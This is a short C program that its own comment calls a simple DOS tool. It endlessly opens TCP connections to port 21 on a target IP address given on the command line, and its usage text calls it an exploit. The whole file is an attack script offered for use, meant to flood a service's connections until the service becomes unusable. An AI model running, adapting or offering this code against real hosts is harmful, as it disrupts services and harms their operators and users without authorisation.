/*
Compile in Linux.

this DOS is simple, it's very simple, this program will open several simultaneous connections.
If the service does not know how to deal with this, it will generate a DOS in its network traffic
consequently making the service unfeasible.

*/


#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>

int main(int argc, char *argv[]){

        int rawSocket;
        int socketConnect;
        int controler = 2;

        if(argc > 1){
            while (controler >= 1){
                printf("Poisoning Socket...\n");
                struct sockaddr_in target;
                rawSocket = socket(AF_INET, SOCK_STREAM, 6);

                target.sin_family = AF_INET;
                target.sin_port = htons(21);
                target.sin_addr.s_addr = inet_addr(argv[1]);
                
                socketConnect = connect(rawSocket, (struct sockaddr *)&target, sizeof target);
                //printf("%i \n", socketConnect); Debug coode
                sleep(0.5);
            }
        } else {
            printf("Host not detected... Please, try again \n");
            printf("Example: ./exploit 192.168.0.1\n");
            return 0;
        }

}